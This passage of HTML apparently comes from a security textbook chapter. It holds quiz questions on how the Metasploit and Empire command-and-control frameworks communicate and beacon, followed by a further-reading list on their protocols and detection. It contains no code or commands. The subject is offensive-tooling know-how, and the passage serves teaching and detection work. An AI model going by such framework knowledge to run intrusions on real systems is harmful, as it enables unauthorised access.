<li>Which of these use TLV as standard for communication?
<ol>
<li>Metasploit</li>
<li>Empire</li>
</ol>
</li>
</ol>
<ol start="4">
<li>Which of these use beaconing for keeping the attacker informed about a target being live?
<ol>
<li>Metasploit</li>
<li>Empire</li>
<li>Both</li>
<li>None of the above</li>
</ol>
</li>
</ol>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Further reading</h1>
                </header>
            
            <article>
                
<p>Check out the following resources for more information on the topics covered in this chapter:</p>
<ul>
<li><strong>Metasploit's detailed communication and protocol writeup</strong>: <a href="https://www.exploit-db.com/docs/english/27935-metasploit---the-exploit-learning-tree.pdf"><span class="URLPACKT">https://www.exploit-db.com/docs/english/27935-metasploit---the-exploit-learning-tree.pdf</span></a></li>
<li><strong>Metasploit's SSL-generation module</strong>: <a href="https://github.com/rapid7/metasploit-framework/blob/76954957c740525cff2db5a60bcf936b4ee06c42/lib/rex/post/meterpreter/client.rb">https://github.com/rapid7/metasploit-framework/blob/76954957c740525cff2db5a60bcf936b4ee06c42/lib/rex/post/meterpreter/client.rb</a></li>
<li><strong>Empire IOCs</strong>: <a href="https://www.sans.org/reading-room/whitepapers/detection/disrupting-empire-identifying-powershell-empire-command-control-activity-38315">https://www.sans.org/reading-room/whitepapers/detection/disrupting-empire-identifying-powershell-empire-command-control-activity-38315</a></li>
<li><strong>Microsoft's list of Windows versions</strong>: <a href="https://en.wikipedia.org/wiki/List_of_Microsoft_Windows_versions">https://en.wikipedia.org/wiki/List_of_Microsoft_Windows_versions</a></li>
</ul>


            </article>

            
        </section>
    </body></html>